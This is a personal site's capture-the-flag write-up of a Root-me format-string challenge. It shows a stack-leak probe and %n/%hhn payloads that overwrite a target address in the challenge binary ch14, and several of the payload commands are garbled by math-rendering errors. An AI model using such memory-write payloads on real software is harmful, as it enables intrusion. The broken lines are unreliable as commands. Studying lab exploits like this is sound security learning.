<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Format string bug basic 2 writeup | Omar2535</title>
    <meta name="generator" content="VuePress 1.9.10">
    
    <meta name="description" content="Notes">
    
    <link rel="preload" href="/assets/css/0.styles.de540ae2.css" as="style"><link rel="preload" href="/assets/js/app.e90b9e2c.js" as="script"><link rel="preload" href="/assets/js/2.53b2ba1e.js" as="script"><link rel="preload" href="/assets/js/1.cc48f7d2.js" as="script"><link rel="preload" href="/assets/js/96.f6e35d5a.js" as="script"><link rel="prefetch" href="/assets/js/10.fc1976ac.js"><link rel="prefetch" href="/assets/js/100.802379ba.js"><link rel="prefetch" href="/assets/js/101.30b4b6e0.js"><link rel="prefetch" href="/assets/js/102.0d4fb7b7.js"><link rel="prefetch" href="/assets/js/103.16270e29.js"><link rel="prefetch" href="/assets/js/104.e764e46c.js"><link rel="prefetch" href="/assets/js/105.a445ecda.js"><link rel="prefetch" href="/assets/js/11.3fce9d23.js"><link rel="prefetch" href="/assets/js/12.dc96233c.js"><link rel="prefetch" href="/assets/js/13.1e689f64.js"><link rel="prefetch" href="/assets/js/14.e1329e2d.js"><link rel="prefetch" href="/assets/js/15.67f7e054.js"><link rel="prefetch" href="/assets/js/16.2ecd0653.js"><link rel="prefetch" href="/assets/js/17.798e9394.js"><link rel="prefetch" href="/assets/js/18.03a744a4.js"><link rel="prefetch" href="/assets/js/19.975dd7c7.js"><link rel="prefetch" href="/assets/js/20.c1b6bd0d.js"><link rel="prefetch" href="/assets/js/21.88b275c9.js"><link rel="prefetch" href="/assets/js/22.ef911ad5.js"><link rel="prefetch" href="/assets/js/23.df6ce246.js"><link rel="prefetch" href="/assets/js/24.ba61c33c.js"><link rel="prefetch" href="/assets/js/25.3195c123.js"><link rel="prefetch" href="/assets/js/26.3d0f6a9a.js"><link rel="prefetch" href="/assets/js/27.92afec31.js"><link rel="prefetch" href="/assets/js/28.2565fed9.js"><link rel="prefetch" href="/assets/js/29.9c8ed229.js"><link rel="prefetch" href="/assets/js/3.74092176.js"><link rel="prefetch" href="/assets/js/30.817fadc8.js"><link rel="prefetch" href="/assets/js/31.e95af4f7.js"><link rel="prefetch" href="/assets/js/32.65c1a09c.js"><link rel="prefetch" href="/assets/js/33.2d7964f4.js"><link rel="prefetch" href="/assets/js/34.4f59fa55.js"><link rel="prefetch" href="/assets/js/35.493484d8.js"><link rel="prefetch" href="/assets/js/36.a9fd784e.js"><link rel="prefetch" href="/assets/js/37.59f79452.js"><link rel="prefetch" href="/assets/js/38.543508ec.js"><link rel="prefetch" href="/assets/js/39.5de45353.js"><link rel="prefetch" href="/assets/js/4.a791e2ff.js"><link rel="prefetch" href="/assets/js/40.7faa7d8a.js"><link rel="prefetch" href="/assets/js/41.80e1e691.js"><link rel="prefetch" href="/assets/js/42.6fe9445e.js"><link rel="prefetch" href="/assets/js/43.e9329d79.js"><link rel="prefetch" href="/assets/js/44.32cc9330.js"><link rel="prefetch" href="/assets/js/45.f1610206.js"><link rel="prefetch" href="/assets/js/46.f274e4ef.js"><link rel="prefetch" href="/assets/js/47.1555cf29.js"><link rel="prefetch" href="/assets/js/48.9c505bfd.js"><link rel="prefetch" href="/assets/js/49.7c1675a4.js"><link rel="prefetch" href="/assets/js/5.213e8a2f.js"><link rel="prefetch" href="/assets/js/50.d752392d.js"><link rel="prefetch" href="/assets/js/51.44c263fa.js"><link rel="prefetch" href="/assets/js/52.bdd1809f.js"><link rel="prefetch" href="/assets/js/53.7cf056c5.js"><link rel="prefetch" href="/assets/js/54.aad110c0.js"><link rel="prefetch" href="/assets/js/55.1f1d59a8.js"><link rel="prefetch" href="/assets/js/56.4bdb98d5.js"><link rel="prefetch" href="/assets/js/57.df2c4b8a.js"><link rel="prefetch" href="/assets/js/58.cd5ccc48.js"><link rel="prefetch" href="/assets/js/59.7926c0a7.js"><link rel="prefetch" href="/assets/js/6.759a3df7.js"><link rel="prefetch" href="/assets/js/60.684e9e0f.js"><link rel="prefetch" href="/assets/js/61.d8f705f9.js"><link rel="prefetch" href="/assets/js/62.35151300.js"><link rel="prefetch" href="/assets/js/63.e354ea08.js"><link rel="prefetch" href="/assets/js/64.98c17167.js"><link rel="prefetch" href="/assets/js/65.ce422c7c.js"><link rel="prefetch" href="/assets/js/66.22abb726.js"><link rel="prefetch" href="/assets/js/67.a09ec169.js"><link rel="prefetch" href="/assets/js/68.642bfba7.js"><link rel="prefetch" href="/assets/js/69.89db523c.js"><link rel="prefetch" href="/assets/js/7.2b5aa5ce.js"><link rel="prefetch" href="/assets/js/70.f9b2468f.js"><link rel="prefetch" href="/assets/js/71.982a3d97.js"><link rel="prefetch" href="/assets/js/72.75edbe60.js"><link rel="prefetch" href="/assets/js/73.0f515ae3.js"><link rel="prefetch" href="/assets/js/74.52f434ef.js"><link rel="prefetch" href="/assets/js/75.4bd299d5.js"><link rel="prefetch" href="/assets/js/76.51b91894.js"><link rel="prefetch" href="/assets/js/77.494a4447.js"><link rel="prefetch" href="/assets/js/78.c17fe7b0.js"><link rel="prefetch" href="/assets/js/79.543318f8.js"><link rel="prefetch" href="/assets/js/80.0b97115b.js"><link rel="prefetch" href="/assets/js/81.66d869c7.js"><link rel="prefetch" href="/assets/js/82.8e8926e8.js"><link rel="prefetch" href="/assets/js/83.dff10bf7.js"><link rel="prefetch" href="/assets/js/84.2ac781a8.js"><link rel="prefetch" href="/assets/js/85.60293f19.js"><link rel="prefetch" href="/assets/js/86.46d7126b.js"><link rel="prefetch" href="/assets/js/87.0c5929f3.js"><link rel="prefetch" href="/assets/js/88.9e892158.js"><link rel="prefetch" href="/assets/js/89.5cceac4c.js"><link rel="prefetch" href="/assets/js/90.be2516f3.js"><link rel="prefetch" href="/assets/js/91.750b3c5c.js"><link rel="prefetch" href="/assets/js/92.8d607653.js"><link rel="prefetch" href="/assets/js/93.b7d0bb09.js"><link rel="prefetch" href="/assets/js/94.8d3e3ddd.js"><link rel="prefetch" href="/assets/js/95.a036ab7d.js"><link rel="prefetch" href="/assets/js/97.6d0c1d57.js"><link rel="prefetch" href="/assets/js/98.df2da740.js"><link rel="prefetch" href="/assets/js/99.83ea7e0f.js"><link rel="prefetch" href="/assets/js/vendors~docsearch.b1b44aa7.js">
    <link rel="stylesheet" href="/assets/css/0.styles.de540ae2.css">
  </head>
  <body>
    <div id="app" data-server-rendered="true"><div class="theme-container"><header class="navbar"><div class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/" class="home-link router-link-active"><!----> <span class="site-name">Omar2535</span></a> <div class="links"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><a href="/blog/" class="nav-link">
  Blog
</a></div><div class="nav-item"><a href="/misc/" class="nav-link router-link-active">
  Misc
</a></div><div class="nav-item"><a href="/about/" class="nav-link">
  About me
</a></div> <!----></nav></div></header> <div class="sidebar-mask"></div> <aside class="sidebar"><nav class="nav-links"><div class="nav-item"><a href="/blog/" class="nav-link">
  Blog
</a></div><div class="nav-item"><a href="/misc/" class="nav-link router-link-active">
  Misc
</a></div><div class="nav-item"><a href="/about/" class="nav-link">
  About me
</a></div> <!----></nav>  <ul class="sidebar-links"><li><a href="/misc/Accomplishments/" class="sidebar-link">Accomplishments</a></li><li><section class="sidebar-group collapsable depth-0"><a href="/misc/Certs/" class="sidebar-heading clickable"><span>Certs</span> <span class="arrow right"></span></a> <!----></section></li><li><section class="sidebar-group collapsable depth-0"><a href="/misc/Courses/" class="sidebar-heading clickable"><span>Courses</span> <span class="arrow right"></span></a> <!----></section></li><li><a href="/misc/Guides/" class="sidebar-link">Guides</a></li><li><section class="sidebar-group collapsable depth-0"><a href="/misc/Hackthebox/" class="sidebar-heading clickable"><span>Hackthebox</span> <span class="arrow right"></span></a> <!----></section></li><li><section class="sidebar-group collapsable depth-0"><a href="/misc/Root-me/" class="sidebar-heading clickable router-link-active open"><span>Root-me</span> <span class="arrow down"></span></a> <ul class="sidebar-links sidebar-group-items"><li><a href="/misc/Root-me/ELF-x64 Stack buffer overflow basic.html" class="sidebar-link">ELFx64 writeup</a></li><li><a href="/misc/Root-me/Format string bug basic 1.html" class="sidebar-link">Format string bug basic 1 writeup</a></li><li><a href="/misc/Root-me/Format string bug basic 2.html" class="active sidebar-link">Format string bug basic 2 writeup</a></li><li><a href="/misc/Root-me/Stack buffer overflow basic 1.html" class="sidebar-link">Writeup</a></li><li><a href="/misc/Root-me/Stack buffer overflow basic 2.html" class="sidebar-link">Stack buffer overflow basic 2 Write up</a></li></ul></section></li><li><section class="sidebar-group collapsable depth-0"><a href="/misc/Tryhackme/" class="sidebar-heading clickable"><span>Tryhackme</span> <span class="arrow right"></span></a> <!----></section></li><li><section class="sidebar-group collapsable depth-0"><a href="/misc/Writeups/" class="sidebar-heading clickable"><span>Writeups</span> <span class="arrow right"></span></a> <!----></section></li></ul> </aside> <main class="page"> <div class="theme-default-content content__default"><h1 id="format-string-bug-basic-2-writeup"><a href="#format-string-bug-basic-2-writeup" class="header-anchor">#</a> Format string bug basic 2 writeup</h1> <p>Used https://www.usna.edu/Users/cs/aviv/classes/si485h/s17/units/06/unit.html as a guide.</p> <p>First, lets use some simple string to look up into the stack and find our passed in argument.</p> <div class="language-sh extra-class"><pre class="language-sh"><code>./ch14 <span class="token string">&quot;AAAA %#08x %#08x %#08x %#08x %#08x %#08x %#08x %#08x %#08x %#08x %#08x %#08x %#08x %#08x %#08x %#08x&quot;</span>

<span class="token comment"># returns [AAAA 0x80485f1 00000000 00000000 0x0000c2 0xbffffb74 0xb7fe1409 0xf63d4e2e 0x4030201 0x41414141 0x38783020 0x35383430 0x3020316]</span>
<span class="token comment"># at the 0x41414141 we see our AAAA that we put in there</span>
</code></pre></div><p>address we want to write to:
0x bf ff fa 68</p> <p>./ch14 $(printf &quot;\x68\xfa\xff\xbf&quot;).%#08x.%#08x.%#08x.%#08x.%#08x.%#08x.%#08x.%#08x</p> <p>We want to write to the address 0xbffffa68. So we put that address as the very first part of our string so that we can refer to it when popping elements off the stack and writing to that address using %n.</p> <p>The result is:
./ch14 $(printf &quot;\x68\xfa\xff\xbf&quot;).%#08x.%#08x.%#08x.%#08x.%#08x.%#08x.%#08x.%#08x.%n</p> <p>which yields us with being on the right way.</p> <p>Since our buffer size at most is 128, we need to do this by doing this cleverly.</p> <p>./ch14 <span title="ParseError: KaTeX parse error: Undefined control sequence: \x at position 10: (printf &quot;\̲x̲4b\xfa\xff\xbf&quot;…" class="katex-error">(printf &quot;\x4b\xfa\xff\xbf&quot;)</span>(printf &quot;\x4a\xfa\xff\xbf&quot;)<span title="ParseError: KaTeX parse error: Undefined control sequence: \x at position 10: (printf &quot;\̲x̲49\xfa\xff\xbf&quot;…" class="katex-error">(printf &quot;\x49\xfa\xff\xbf&quot;)</span>(printf &quot;\x48\xfa\xff\xbf&quot;)%#08x.%#08x.%#08x.%#08x.%#08x.%#08x.%#08x.%#146x.%hhn.%hhn</p> <p>address changed again!
./ch14 <span title="ParseError: KaTeX parse error: Undefined control sequence: \x at position 10: (printf &quot;\̲x̲4b\xfa\xff\xbf&quot;…" class="katex-error">(printf &quot;\x4b\xfa\xff\xbf&quot;)</span>(printf &quot;\x4a\xfa\xff\xbf&quot;)<span title="ParseError: KaTeX parse error: Undefined control sequence: \x at position 10: (printf &quot;\̲x̲49\xfa\xff\xbf&quot;…" class="katex-error">(printf &quot;\x49\xfa\xff\xbf&quot;)</span>(printf &quot;\x48\xfa\xff\xbf&quot;)%#08x.%#08x.%#08x.%#08x.%#08x.%#08x.%#08x.%#146x.%hhn.%hhn</p> <p>./ch14 <span title="ParseError: KaTeX parse error: Undefined control sequence: \x at position 10: (printf &quot;\̲x̲4b\xfa\xff\xbf&quot;…" class="katex-error">(printf &quot;\x4b\xfa\xff\xbf&quot;)</span>(printf &quot;\x4a\xfa\xff\xbf&quot;)<span title="ParseError: KaTeX parse error: Undefined control sequence: \x at position 10: (printf &quot;\̲x̲49\xfa\xff\xbf&quot;…" class="katex-error">(printf &quot;\x49\xfa\xff\xbf&quot;)</span>(printf &quot;\x48\xfa\xff\xbf&quot;).%1$07x.%9$hhn.%1$08x.%\10$hhn.%1$08x.%\11$hhn.%1$08x.%\12$hhn</p> <p>./ch14 <span title="ParseError: KaTeX parse error: Undefined control sequence: \x at position 10: (printf &quot;\̲x̲4b\xfa\xff\xbf&quot;…" class="katex-error">(printf &quot;\x4b\xfa\xff\xbf&quot;)</span>(printf &quot;\x4a\xfa\xff\xbf&quot;)<span title="ParseError: KaTeX parse error: Undefined control sequence: \x at position 10: (printf &quot;\̲x̲49\xfa\xff\xbf&quot;…" class="katex-error">(printf &quot;\x49\xfa\xff\xbf&quot;)</span>(printf &quot;\x48\xfa\xff\xbf&quot;).%1$204x.%9$hhn.%1$205x.%\10$hhn.%1$15x.%\11$hhn.%1$47x.%\12$hhn</p></div> <footer class="page-edit"><!----> <!----></footer> <div class="page-nav"><p class="inner"><span class="prev">
      ←
      <a href="/misc/Root-me/Format string bug basic 1.html" class="prev">
        Format string bug basic 1 writeup
      </a></span> <span class="next"><a href="/misc/Root-me/Stack buffer overflow basic 1.html">
        Writeup
      </a>
      →
    </span></p></div> </main></div><div class="global-ui"><!----><!----></div></div>
    <script src="/assets/js/app.e90b9e2c.js" defer></script><script src="/assets/js/2.53b2ba1e.js" defer></script><script src="/assets/js/1.cc48f7d2.js" defer></script><script src="/assets/js/96.f6e35d5a.js" defer></script>
  </body>
</html>
